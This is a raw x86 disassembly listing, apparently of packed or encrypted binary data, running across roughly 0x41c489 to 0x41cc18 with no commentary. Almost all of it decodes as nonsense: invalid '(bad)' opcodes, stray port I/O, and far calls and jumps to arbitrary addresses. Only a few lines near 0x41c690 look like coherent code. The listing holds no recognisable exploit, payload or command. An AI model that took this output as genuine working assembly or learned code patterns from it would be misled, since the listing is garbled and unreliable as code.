  41c489:	in     eax,0xd9
  41c48b:	or     ch,ch
  41c48d:	dec    bl
  41c48f:	cwde   
  41c490:	or     DWORD PTR ds:0x6eb1e300,edi
  41c496:	mov    edx,0x6335c60b
  41c49b:	mov    esi,0xb7afd1c
  41c4a0:	cmp    al,0x81
  41c4a2:	(bad)  
  41c4a3:	mov    dl,0x52
  41c4a5:	mov    eax,ds:0x3de23800
  41c4aa:	adc    ebp,DWORD PTR [edi+0x6ee1502a]
  41c4b0:	and    DWORD PTR [eax-0x36],0xffffffaf
  41c4b4:	jmp    0x793c6599
  41c4b9:	std    
  41c4ba:	mov    BYTE PTR [ebx+0x23],al
  41c4bd:	das    
  41c4be:	sub    esi,esp
  41c4c0:	xchg   BYTE PTR [ecx+0x1d],bl
  41c4c3:	(bad)  
  41c4c4:	(bad)  
  41c4c5:	jge    0x41c44c
  41c4c7:	nop
  41c4c8:	xchg   edx,eax
  41c4c9:	and    ecx,DWORD PTR [ebp-0x75]
  41c4cc:	popf   
  41c4cd:	pop    edi
  41c4ce:	pop    esi
  41c4cf:	mov    eax,ds:0x117187c3
  41c4d4:	sahf   
  41c4d5:	stos   BYTE PTR es:[edi],al
  41c4d6:	test   al,0x46
  41c4d8:	dec    esp
  41c4d9:	sbb    esi,DWORD PTR [ebp-0x2d04cada]
  41c4df:	sub    ah,BYTE PTR [ebx-0x6f]
  41c4e2:	es dec edi
  41c4e4:	ins    DWORD PTR es:[edi],dx
  41c4e5:	test   DWORD PTR [ebx-0x19],eax
  41c4e8:	test   DWORD PTR ds:[esi+0xf68db83],0x679204ed
  41c4f3:	or     cl,BYTE PTR [esi]
  41c4f5:	jno    0x41c573
  41c4f7:	in     al,0xa6
  41c4f9:	and    DWORD PTR [ebx],0x77
  41c4fc:	sub    ah,BYTE PTR [ecx]
  41c4fe:	push   cs
  41c4ff:	enter  0xc540,0x83
  41c503:	add    dh,cl
  41c505:	push   es
  41c506:	adc    DWORD PTR gs:[ebx],eax
  41c509:	sub    eax,DWORD PTR [eax+0x36c160a7]
  41c50f:	pop    es
  41c510:	lods   al,BYTE PTR ds:[esi]
  41c511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c512:	repz sub eax,0x591bfa8c
  41c518:	xor    al,0x3
  41c51a:	stos   DWORD PTR es:[edi],eax
  41c51b:	cmc    
  41c51c:	pop    es
  41c51d:	xor    DWORD PTR [edi-0x7bbab00a],ebp
  41c523:	jno    0x41c585
  41c525:	pop    eax
  41c526:	ins    DWORD PTR es:[edi],dx
  41c527:	test   al,0x24
  41c529:	jne    0x41c515
  41c52b:	fidivr DWORD PTR [edx+0x63]
  41c52e:	int3   
  41c52f:	call   FWORD PTR [ebx]
  41c531:	stos   BYTE PTR es:[edi],al
  41c532:	loop   0x41c4da
  41c534:	push   0x7b
  41c536:	mov    ecx,0x301bfed5
  41c53b:	or     eax,0x835548fe
  41c540:	mov    ds:0x7f332b46,al
  41c545:	popf   
  41c546:	in     al,0xdb
  41c548:	lds    esi,FWORD PTR [eax+eax*4+0x462c7986]
  41c54f:	cdq    
  41c550:	jbe    0x41c556
  41c552:	push   0xdeaf9188
  41c557:	jns    0x41c53f
  41c559:	and    eax,0x31cf17ad
  41c55e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c55f:	ins    BYTE PTR es:[edi],dx
  41c560:	mov    cl,BYTE PTR [ebp-0x6]
  41c563:	out    0x42,al
  41c565:	js     0x41c4fc
  41c567:	std    
  41c568:	fwait
  41c569:	out    0xd5,eax
  41c56b:	pop    edi
  41c56c:	push   ebp
  41c56d:	shr    BYTE PTR ds:0xeafb2da9,cl
  41c573:	stos   DWORD PTR es:[edi],eax
  41c574:	cmp    cl,bl
  41c576:	and    al,0xcf
  41c578:	popaw  
  41c57a:	sahf   
  41c57b:	mov    cl,0x3d
  41c57d:	or     al,0x9
  41c57f:	(bad)  
  41c580:	mov    ecx,DWORD PTR [esi+eiz*2]
  41c583:	adc    DWORD PTR [ebx],esi
  41c585:	push   ds
  41c586:	lods   al,BYTE PTR ds:[esi]
  41c587:	mov    ds:0x5105cd2,eax
  41c58c:	jg     0x41c587
  41c58e:	jle    0x41c557
  41c590:	mov    dl,0x4d
  41c592:	retf   
  41c593:	mov    ah,0xff
  41c595:	pop    eax
  41c596:	out    0x74,al
  41c598:	push   esp
  41c599:	fcmovne st,st(7)
  41c59b:	imul   edx,ebp,0xffffffb6
  41c59e:	test   esi,edx
  41c5a0:	and    BYTE PTR [eax+0x4097d37c],al
  41c5a6:	cmp    dl,ah
  41c5a8:	mov    ecx,0x5650fd0c
  41c5ad:	sar    al,cl
  41c5af:	arpl   WORD PTR [edx-0x231dc813],dx
  41c5b5:	sub    BYTE PTR [edi-0x216b979b],ch
  41c5bb:	mov    eax,ds:0x1e97fef6
  41c5c0:	rcl    DWORD PTR [ebx],1
  41c5c2:	jno    0x41c5e8
  41c5c4:	sahf   
  41c5c5:	dec    eax
  41c5c6:	dec    esi
  41c5c7:	xor    dh,dl
  41c5c9:	adc    eax,0x88d5f25c
  41c5ce:	test   eax,0xff8f8f6a
  41c5d3:	sti    
  41c5d4:	pop    ss
  41c5d5:	push   ss
  41c5d6:	stc    
  41c5d7:	jle    0x41c58e
  41c5d9:	or     BYTE PTR [edi+0x3b1aa958],dl
  41c5df:	nop
  41c5e0:	idiv   BYTE PTR [esi+0x48]
  41c5e3:	(bad)  
  41c5e4:	sti    
  41c5e5:	int3   
  41c5e6:	repz jno 0x41c5b7
  41c5e9:	mov    eax,ds:0xafdf9ac0
  41c5ee:	popa   
  41c5ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5f0:	or     ah,BYTE PTR [esi]
  41c5f2:	pushf  
  41c5f3:	es mov DWORD PTR ds:[ebx+0x4da530c],ecx
  41c5fb:	inc    edx
  41c5fc:	jo     0x41c66e
  41c5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ff:	mov    ah,0xb1
  41c601:	xor    cl,BYTE PTR [esi+0x26]
  41c604:	cmp    BYTE PTR [ebx+0x41],0xdd
  41c608:	cdq    
  41c609:	inc    edi
  41c60a:	xlat   BYTE PTR ds:[ebx]
  41c60b:	and    cl,BYTE PTR [ecx+ebx*2+0x6b]
  41c60f:	mov    DWORD PTR [ebx+eiz*2+0x72],0x7e85c958
  41c617:	dec    edx
  41c618:	sbb    dl,dh
  41c61a:	fistp  WORD PTR [ebx-0x3320ee8c]
  41c620:	mov    ah,0xb4
  41c622:	mov    dl,0x9f
  41c624:	mov    cl,0xe9
  41c626:	data16 in al,0xab
  41c629:	sub    BYTE PTR [ecx],dl
  41c62b:	outs   dx,DWORD PTR ds:[esi]
  41c62c:	stc    
  41c62d:	fldz   
  41c62f:	inc    esp
  41c630:	pop    edi
  41c631:	cmp    eax,DWORD PTR [edi]
  41c633:	adc    DWORD PTR [eax],ecx
  41c635:	sbb    edi,0x88b401ef
  41c63b:	mov    bl,0x69
  41c63d:	jecxz  0x41c5ea
  41c63f:	cmp    eax,esp
  41c641:	popa   
  41c642:	adc    BYTE PTR [esi],cl
  41c644:	or     ah,BYTE PTR [ebx-0x32]
  41c647:	out    0x29,eax
  41c649:	mov    al,0xa0
  41c64b:	xor    ebx,eax
  41c64d:	in     al,dx
  41c64e:	jae    0x41c679
  41c650:	mov    ebp,0x94d7b1d0
  41c655:	adc    esi,DWORD PTR [ecx-0x24e1c2bb]
  41c65b:	ja     0x41c656
  41c65d:	jbe    0x41c68f
  41c65f:	test   eax,0x6a7ae597
  41c664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c665:	pop    es
  41c666:	lahf   
  41c667:	mov    ebp,0x64efc704
  41c66c:	and    al,0xd3
  41c66e:	(bad)  
  41c66f:	out    0xc4,al
  41c671:	or     edx,DWORD PTR [edx]
  41c673:	inc    esp
  41c674:	gs xor eax,0xc6f12934
  41c67a:	arpl   WORD PTR [edx+0x3],bx
  41c67d:	std    
  41c67e:	xor    ch,BYTE PTR [ecx]
  41c680:	xchg   esp,eax
  41c681:	mov    al,0x56
  41c683:	mov    cl,BYTE PTR [ecx]
  41c685:	sti    
  41c686:	fidiv  WORD PTR [ebx]
  41c688:	fisttp DWORD PTR [ebp+0x1803f045]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x5019773e,eax
  41c6cc:	stos   DWORD PTR es:[edi],eax
  41c6cd:	mov    ah,0x0
  41c6cf:	icebp  
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c70e
  41c6d7:	mov    eax,0x362fa514
  41c6dc:	cmp    al,0x2
  41c6de:	rcr    bh,0x2c
  41c6e1:	cmc    
  41c6e2:	mov    ch,0x63
  41c6e4:	dec    ebp
  41c6e5:	adc    ebp,DWORD PTR [ebp-0x177a3633]
  41c6eb:	add    eax,0x734b0c06
  41c6f0:	outs   dx,DWORD PTR ds:[esi]
  41c6f1:	mov    dh,bl
  41c6f3:	in     eax,dx
  41c6f4:	int    0x7a
  41c6f6:	fiadd  DWORD PTR [edx]
  41c6f8:	aad    0xa0
  41c6fa:	xchg   BYTE PTR [edi],ah
  41c6fc:	dec    esi
  41c6fd:	push   ebp
  41c6fe:	cmp    DWORD PTR [ebx+edi*1],esi
  41c701:	loopne 0x41c74a
  41c703:	inc    ebp
  41c704:	mov    dh,0x59
  41c706:	addr16 cmp al,0x1a
  41c709:	pusha  
  41c70a:	leave  
  41c70b:	adc    dh,BYTE PTR [ebp+ebx*4+0x73564ad8]
  41c712:	data16 scas al,BYTE PTR es:[edi]
  41c714:	mov    ecx,0xcf66ad3e
  41c719:	xchg   ecx,eax
  41c71a:	jmp    0xe7c2f0c
  41c71f:	lds    edi,FWORD PTR [eax-0x13193618]
  41c725:	pop    ds
  41c726:	cwde   
  41c727:	vaddsubps ymm4,ymm3,YMMWORD PTR [ebx-0x67]
  41c72c:	rcr    DWORD PTR [esi+0x4d],1
  41c72f:	mov    ch,0x76
  41c731:	mov    eax,esp
  41c733:	retf   
  41c734:	mov    ecx,esi
  41c736:	dec    ebp
  41c737:	mov    ah,0x52
  41c739:	add    eax,0xfdad74ec
  41c73e:	push   ebx
  41c73f:	and    ah,BYTE PTR [ebp+eiz*8-0x4d50cf7b]
  41c746:	ss sar esp,1
  41c749:	mov    dl,0xc5
  41c74b:	cs adc al,0xef
  41c74e:	(bad)  
  41c74f:	sahf   
  41c750:	fist   DWORD PTR [eax+0x4df31882]
  41c756:	push   esp
  41c757:	mov    eax,0xdfd80e1f
  41c75c:	mov    ?,WORD PTR [eax-0x5d511147]
  41c762:	push   ss
  41c763:	loope  0x41c73b
  41c765:	and    al,0x11
  41c767:	xor    BYTE PTR [edx-0x50f60254],cl
  41c76d:	loop   0x41c76f
  41c76f:	cmc    
  41c770:	adc    ah,BYTE PTR [ebp+0x716fbc08]
  41c776:	pop    ebx
  41c777:	inc    ebx
  41c778:	mov    ecx,0x110b58bf
  41c77d:	or     al,0x14
  41c77f:	(bad)  
  41c780:	dec    edi
  41c781:	(bad)  
  41c783:	test   BYTE PTR [ecx+ecx*4+0x573760ee],cl
  41c78a:	dec    eax
  41c78b:	pop    edx
  41c78c:	pop    ebp
  41c78d:	call   0xb1a3:0x12224915
  41c794:	sahf   
  41c795:	sbb    al,0xc2
  41c797:	imul   edi,DWORD PTR [ebp-0x751c9d6b],0xffffffbd
  41c79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c79f:	ror    DWORD PTR [ebp+0x7c929433],1
  41c7a5:	adc    eax,0x1da76945
  41c7aa:	stc    
  41c7ab:	and    ebx,0x74
  41c7ae:	jmp    0x961e:0x55c2ef34
  41c7b5:	cmp    ah,bl
  41c7b7:	cs xchg edx,eax
  41c7b9:	arpl   bp,bx
  41c7bb:	xlat   BYTE PTR ds:[ebx]
  41c7bc:	add    eax,0x5fc12fe
  41c7c1:	pusha  
  41c7c2:	mov    al,ds:0x1f3e7e81
  41c7c7:	bound  ecx,QWORD PTR [edx-0x48]
  41c7ca:	dec    eax
  41c7cb:	fcmovb st,st(1)
  41c7cd:	xchg   ebx,eax
  41c7ce:	push   ds
  41c7cf:	fbstp  TBYTE PTR [eax+0x40]
  41c7d2:	test   al,0xe3
  41c7d4:	data16 mov al,ds:0x5739af86
  41c7da:	imul   edi,DWORD PTR [edx+ebx*2+0x2862c304],0xffffffd0
  41c7e2:	sub    eax,0x29ceba59
  41c7e7:	sbb    edi,DWORD PTR ds:0x47d3f391
  41c7ed:	sbb    ch,BYTE PTR [eax+eiz*8+0x4010b8ef]
  41c7f4:	or     bl,BYTE PTR [edi+edx*2-0x29]
  41c7f8:	lea    ecx,[edi]
  41c7fa:	push   ebx
  41c7fb:	arpl   cx,dx
  41c7fd:	pop    ecx
  41c7fe:	or     al,al
  41c800:	jno    0x41c7fc
  41c802:	repz inc edx
  41c804:	call   0x345:0x35ac3815
  41c80b:	pop    esi
  41c80c:	push   0xd334f609
  41c811:	xchg   ecx,eax
  41c812:	xlat   BYTE PTR ds:[ebx]
  41c813:	pop    es
  41c814:	out    0x1b,eax
  41c816:	dec    ebx
  41c817:	test   al,0x8c
  41c819:	mov    ebp,0x32c718af
  41c81e:	mov    edi,0x7afcc566
  41c823:	and    al,0x6a
  41c825:	(bad)  
  41c826:	mov    ebp,0x96746fc8
  41c82b:	pop    esi
  41c82c:	push   eax
  41c82d:	add    eax,0xebe69486
  41c832:	es ret 
  41c834:	sbb    eax,edi
  41c836:	fwait
  41c837:	mov    esp,0x7ebd5734
  41c83c:	add    DWORD PTR [ecx+0x1],ecx
  41c83f:	mov    esp,0xf9beeeb4
  41c844:	dec    esi
  41c845:	cdq    
  41c846:	in     eax,dx
  41c847:	or     al,0x6
  41c849:	push   ds
  41c84a:	pop    ds
  41c84b:	mov    edx,0xeececfb4
  41c850:	push   es
  41c851:	mov    bh,0xec
  41c853:	mov    eax,ds:0x170a535c
  41c858:	clc    
  41c859:	mov    eax,0x9cefc182
  41c85e:	pop    esp
  41c85f:	pop    ss
  41c860:	dec    esi
  41c861:	into   
  41c862:	add    al,0x94
  41c864:	repz pop ebp
  41c866:	cs test esp,edx
  41c869:	adc    al,0xbb
  41c86b:	mov    WORD PTR [ecx-0x7e13f5fa],?
  41c871:	(bad)  
  41c873:	call   FWORD PTR [ecx+0x3ac38ac1]
  41c879:	sub    DWORD PTR [eax+0x23],edi
  41c87c:	daa    
  41c87d:	inc    ebx
  41c87e:	aaa    
  41c87f:	fldenv [edi]
  41c881:	pop    ds
  41c882:	pop    es
  41c883:	repz push cs
  41c885:	inc    eax
  41c886:	add    eax,0x80124a65
  41c88b:	popa   
  41c88c:	(bad)  
  41c88d:	pusha  
  41c88e:	xor    al,0xd
  41c890:	inc    ebp
  41c891:	push   cs
  41c892:	iret   
  41c893:	bound  ebp,QWORD PTR [eax-0x60]
  41c896:	xchg   esi,eax
  41c897:	lahf   
  41c898:	sbb    DWORD PTR [ebp+0x50],edx
  41c89b:	push   ds
  41c89c:	idiv   BYTE PTR [ebx]
  41c89e:	call   0x8bb0678e
  41c8a3:	cmp    dh,BYTE PTR [edi]
  41c8a5:	dec    esp
  41c8a6:	push   ecx
  41c8a7:	add    al,0xda
  41c8a9:	inc    eax
  41c8aa:	hlt    
  41c8ab:	js     0x41c929
  41c8ad:	aad    0x2
  41c8af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b0:	retf   0x52a7
  41c8b3:	mov    bl,0xe0
  41c8b5:	ja     0x41c8f7
  41c8b7:	mov    dl,BYTE PTR [ebx+eax*8]
  41c8ba:	test   DWORD PTR [ecx+0x66],esp
  41c8bd:	cmp    BYTE PTR [edx+0x445b17c9],ah
  41c8c3:	xchg   dl,dl
  41c8c5:	nop
  41c8c6:	mov    esi,0x21c659bf
  41c8cb:	mov    ecx,0xff174d73
  41c8d0:	pop    ebx
  41c8d1:	sub    BYTE PTR [ebp-0xa76fae],ah
  41c8d7:	adc    ecx,DWORD PTR [ebp-0x148c92f8]
  41c8dd:	test   BYTE PTR [ecx+0x654c0be8],al
  41c8e3:	and    DWORD PTR [esi],edi
  41c8e5:	add    eax,0xf340d44a
  41c8ea:	pop    esp
  41c8eb:	(bad)  
  41c8ec:	mov    bl,0x44
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	bound  eax,QWORD PTR [ebp-0x8e763bf]
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c8a7
  41c91c:	and    DWORD PTR [eax],eax
  41c91e:	xor    WORD PTR ss:[esi],cx
  41c922:	mov    BYTE PTR [edx-0x4c],bh
  41c925:	rcl    DWORD PTR [ebx-0x76],1
  41c928:	cmp    DWORD PTR [eax+0x23c1dbc8],ebp
  41c92e:	and    cl,BYTE PTR [ebp+0x20]
  41c931:	or     eax,0x490fabd3
  41c936:	mov    esp,0x77b6960a
  41c93b:	add    al,0xff
  41c93d:	adc    DWORD PTR [ecx+0x4478a9c9],edi
  41c943:	aaa    
  41c944:	sbb    eax,0x1837da07
  41c949:	sub    al,0x3b
  41c94b:	mov    eax,0xb72003d9
  41c950:	jne    0x41c954
  41c952:	pop    es
  41c953:	inc    edi
  41c954:	or     ebp,DWORD PTR [edx+0x12]
  41c957:	fwait
  41c958:	dec    esi
  41c959:	outs   dx,DWORD PTR ds:[si]
  41c95b:	push   cs
  41c95c:	inc    ecx
  41c95d:	cmp    eax,0xd7e96af
  41c962:	data16 std 
  41c964:	xchg   BYTE PTR [eax+0x2f67278c],dl
  41c96a:	mov    eax,ds:0x3c71c99c
  41c96f:	out    0x57,eax
  41c971:	jecxz  0x41c9e3
  41c973:	add    DWORD PTR [ebx],esi
  41c975:	dec    DWORD PTR [esi]
  41c977:	cmp    dh,BYTE PTR [ecx+0x5b]
  41c97a:	jns    0x41c9b9
  41c97c:	mov    edx,0xe2c2c2a6
  41c981:	js     0x41c96f
  41c983:	outs   dx,BYTE PTR ds:[esi]
  41c984:	jo     0x41c933
  41c986:	not    BYTE PTR [edx+ebx*4+0xf]
  41c98a:	xor    eax,0x8e335460
  41c98f:	cmp    al,0x35
  41c991:	pop    edx
  41c992:	push   edx
  41c993:	inc    edi
  41c994:	jo     0x41c919
  41c996:	das    
  41c997:	push   ss
  41c998:	rol    DWORD PTR [eax+0x6],1
  41c99b:	(bad)  
  41c99c:	imul   esi,DWORD PTR [esi+0xd8cc9ff],0xfffffff6
  41c9a3:	leave  
  41c9a4:	sub    dh,BYTE PTR [edx+0x190d0964]
  41c9aa:	mov    ch,0x54
  41c9ac:	arpl   WORD PTR [esi],dx
  41c9ae:	(bad)  
  41c9af:	maxps  xmm1,XMMWORD PTR [edi-0x700f0295]
  41c9b6:	jmp    0x41c949
  41c9b8:	je     0x41c9ee
  41c9ba:	push   eax
  41c9bb:	xor    al,0xaa
  41c9bd:	push   es
  41c9be:	imul   ebx,DWORD PTR [ebp+esi*2-0x20],0x3c6e9bf4
  41c9c6:	clc    
  41c9c7:	outs   dx,DWORD PTR ds:[esi]
  41c9c8:	mov    al,0xff
  41c9ca:	jp     0x41c99b
  41c9cc:	mov    al,ds:0x4073a4a5
  41c9d1:	in     al,dx
  41c9d2:	jne    0x41c9d4
  41c9d4:	scas   eax,DWORD PTR es:[edi]
  41c9d5:	inc    esi
  41c9d6:	aam    0xdf
  41c9d8:	cs xchg ebp,eax
  41c9da:	sti    
  41c9db:	mov    edx,0x54c282ba
  41c9e0:	fs retf 
  41c9e2:	inc    edx
  41c9e3:	jo     0x41ca40
  41c9e5:	(bad)  
  41c9e6:	push   ss
  41c9e7:	inc    edx
  41c9e8:	mov    esp,0xe3cdc9c6
  41c9ed:	loope  0x41c99f
  41c9ef:	out    0x0,eax
  41c9f1:	cmp    DWORD PTR [edx],edi
  41c9f3:	aaa    
  41c9f4:	call   FWORD PTR [edi]
  41c9f6:	push   cs
  41c9f7:	retf   0xc353
  41c9fa:	mov    dh,0xb4
  41c9fc:	mov    esi,0xfa4210aa
  41ca01:	imul   ebx,DWORD PTR [ebx+0x2f6c1fbc],0xffffffd4
  41ca08:	jmp    0x41ca64
  41ca0a:	stos   BYTE PTR es:[edi],al
  41ca0b:	mov    dh,0x46
  41ca0d:	out    0x67,eax
  41ca0f:	or     eax,0x1db105c3
  41ca14:	mov    ecx,0x5a342551
  41ca19:	mov    ebx,0xfac399fd
  41ca1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca1f:	mov    eax,ds:0xd4b73956
  41ca24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca25:	sub    bh,ah
  41ca27:	(bad)  
  41ca28:	sbb    BYTE PTR [ebx],dh
  41ca2a:	fdivp  st(1),st
  41ca2c:	sbb    al,0x32
  41ca2e:	ror    bl,cl
  41ca30:	ret    
  41ca31:	ret    0x3e15
  41ca34:	pop    ss
  41ca35:	sub    eax,0xe0ebe605
  41ca3a:	sub    ch,BYTE PTR [ecx-0x474620ae]
  41ca40:	and    DWORD PTR [edi+esi*8-0x38b71d72],ebx
  41ca47:	repnz das 
  41ca49:	pop    ecx
  41ca4a:	xor    eax,0xd95ee2d
  41ca4f:	popa   
  41ca50:	inc    eax
  41ca51:	sub    BYTE PTR [esp+eax*4],ah
  41ca54:	xchg   edx,eax
  41ca55:	adc    ch,BYTE PTR [ebx-0xf]
  41ca58:	scas   al,BYTE PTR es:[edi]
  41ca59:	das    
  41ca5a:	sbb    ebp,DWORD PTR [esi-0x23]
  41ca5d:	and    eax,0x983aabd1
  41ca62:	mov    al,BYTE PTR [edi+0x7073cf3e]
  41ca68:	xor    BYTE PTR [eax-0x56a9fadf],dh
  41ca6e:	mov    ds:0x82b4ed2d,eax
  41ca73:	xor    DWORD PTR [ebx+edx*1+0x1e],0x50
  41ca78:	and    edi,0x61e1fb8f
  41ca7e:	inc    eax
  41ca7f:	(bad)  
  41ca80:	rcr    DWORD PTR [esi+edx*8+0xdac6d50],cl
  41ca87:	fdiv   QWORD PTR [ebx+0x70]
  41ca8a:	int    0xfa
  41ca8c:	push   eax
  41ca8d:	imul   eax,esp,0xa53b02e5
  41ca93:	mov    eax,gs
  41ca95:	out    0x49,al
  41ca97:	test   DWORD PTR [esi*1-0x3acf934d],edx
  41ca9e:	retf   
  41ca9f:	mov    bh,0xad
  41caa1:	or     ecx,DWORD PTR [esp+eax*1-0x2e]
  41caa5:	push   edx
  41caa6:	aad    0xbb
  41caa8:	call   0xe483624d
  41caad:	or     edx,DWORD PTR [edi-0x32bf72f7]
  41cab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cab4:	out    0xff,eax
  41cab6:	loop   0x41ca4d
  41cab8:	pushf  
  41cab9:	clc    
  41caba:	shr    DWORD PTR fs:[edi+esi*4+0x75],cl
  41cabf:	sub    BYTE PTR [edx*2+0x6eac3113],bl
  41cac6:	int    0x5b
  41cac8:	ds out dx,eax
  41caca:	addr16 (bad) 
  41cacc:	aad    0xc1
  41cace:	or     cl,BYTE PTR [edx-0x281084a2]
  41cad4:	loope  0x41caf4
  41cad6:	shl    BYTE PTR [ebx-0x58077f81],1
  41cadc:	test   DWORD PTR [ecx+edx*2-0x6a4b292f],ecx
  41cae3:	xchg   edx,eax
  41cae4:	mov    BYTE PTR [eax-0x6],0xc6
  41cae8:	lea    eax,[esp+edx*8-0x74]
  41caec:	and    edi,DWORD PTR [eax]
  41caee:	adc    al,0xc3
  41caf0:	xor    al,0xeb
  41caf2:	or     dh,BYTE PTR [eax+0x4b]
  41caf5:	out    dx,al
  41caf6:	cld    
  41caf7:	mov    bl,0xbc
  41caf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cafa:	fucomip st,st(5)
  41cafc:	shr    BYTE PTR [esi-0x335d5af5],cl
  41cb02:	hlt    
  41cb03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb04:	pop    es
  41cb05:	lahf   
  41cb06:	jb     0x41cb78
  41cb08:	aam    0xe9
  41cb0a:	mov    esi,0x8011bc6
  41cb0f:	inc    edx
  41cb10:	retf   0x9d3c
  41cb13:	push   ecx
  41cb14:	mov    BYTE PTR [esi],bh
  41cb16:	xchg   DWORD PTR [ecx-0x718d454b],eax
  41cb1c:	cmp    esp,DWORD PTR [ecx+0x39aafd6b]
  41cb22:	mov    ds:0x14f2dfb2,eax
  41cb27:	mov    bl,BYTE PTR [ebx+ebx*8]
  41cb2a:	jbe    0x41caf3
  41cb2c:	sbb    eax,0x9b264a4d
  41cb31:	shl    BYTE PTR ds:0x230e95e,0x0
  41cb38:	add    dh,cl
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x16a56037
  41cb47:	sub    ebx,DWORD PTR [ecx]
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cbc9
  41cb52:	sbb    eax,0x73a82bc7
  41cb57:	dec    esi
  41cb58:	jne    0x41cb1c
  41cb5a:	inc    esi
  41cb5b:	xor    cl,BYTE PTR [edi-0x3601b58a]
  41cb61:	loopne 0x41cb15
  41cb63:	into   
  41cb64:	mov    ds,WORD PTR ds:0x3b9268a1
  41cb6a:	pop    ecx
  41cb6b:	std    
  41cb6c:	mov    ch,0x9
  41cb6e:	cmp    al,0xc7
  41cb70:	mov    dl,0x85
  41cb72:	in     al,dx
  41cb73:	call   0x7e9f:0x549b848e
  41cb7a:	mov    ebp,0xa13470b
  41cb7f:	fsubr  DWORD PTR cs:[edi]
  41cb82:	xchg   ebx,eax
  41cb83:	xchg   edx,eax
  41cb84:	push   ebp
  41cb85:	pop    ds
  41cb86:	and    BYTE PTR [ebp-0x3a],al
  41cb89:	sub    BYTE PTR [esi-0x6a],bh
  41cb8c:	jecxz  0x41cbd9
  41cb8e:	aaa    
  41cb8f:	adc    edi,0xffffffd9
  41cb92:	fcmove st,st(7)
  41cb94:	mov    esi,0x6d14c48f
  41cb99:	and    al,BYTE PTR [ebp+0x3d]
  41cb9c:	cld    
  41cb9d:	mov    dh,0x65
  41cb9f:	stc    
  41cba0:	test   al,0x53
  41cba2:	jo     0x41cb94
  41cba4:	mov    eax,ds:0xbda95206
  41cba9:	sub    al,dh
  41cbab:	sbb    BYTE PTR [ecx+0x1ea58462],0x8
  41cbb2:	stc    
  41cbb3:	jle    0x41cb4d
  41cbb5:	hlt    
  41cbb6:	xchg   edi,eax
  41cbb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbb8:	jmp    0xf1e4:0xc8207d04
  41cbbf:	rol    DWORD PTR [ecx+0x25c932a1],1
  41cbc5:	cmp    BYTE PTR [esi],bl
  41cbc7:	icebp  
  41cbc8:	fisttp DWORD PTR [esp+edi*8]
  41cbcb:	hlt    
  41cbcc:	clc    
  41cbcd:	ror    BYTE PTR [eax+0xa],1
  41cbd0:	or     dh,al
  41cbd2:	in     eax,dx
  41cbd3:	push   cs
  41cbd4:	push   ecx
  41cbd5:	(bad)  
  41cbd6:	sar    bl,1
  41cbd8:	sub    edi,esp
  41cbda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbdb:	imul   al
  41cbdd:	mov    ecx,0x5bae13d3
  41cbe2:	xchg   ebp,eax
  41cbe3:	out    0x7e,al
  41cbe5:	jmp    0x41cbc0
  41cbe7:	and    ebp,DWORD PTR [eax-0x7964c555]
  41cbed:	(bad)  
  41cbee:	push   esi
  41cbef:	fdiv   DWORD PTR [ebx-0x20ae4cf7]
  41cbf5:	add    edi,esp
  41cbf7:	mov    ah,0x7f
  41cbf9:	pop    es
  41cbfa:	fld    DWORD PTR [edi+ecx*8]
  41cbfd:	into   
  41cbfe:	ror    DWORD PTR [ecx-0x4398ca2c],cl
  41cc04:	jp     0x41cc58
  41cc06:	stos   BYTE PTR es:[edi],al
  41cc07:	popa   
  41cc08:	or     esp,edi
  41cc0a:	test   BYTE PTR [ecx+0x6751e59b],bh
  41cc10:	xchg   BYTE PTR [ebp-0x42dd9902],dh
  41cc16:	jle    0x41cbb4
  41cc18:	mov    bl,0x61
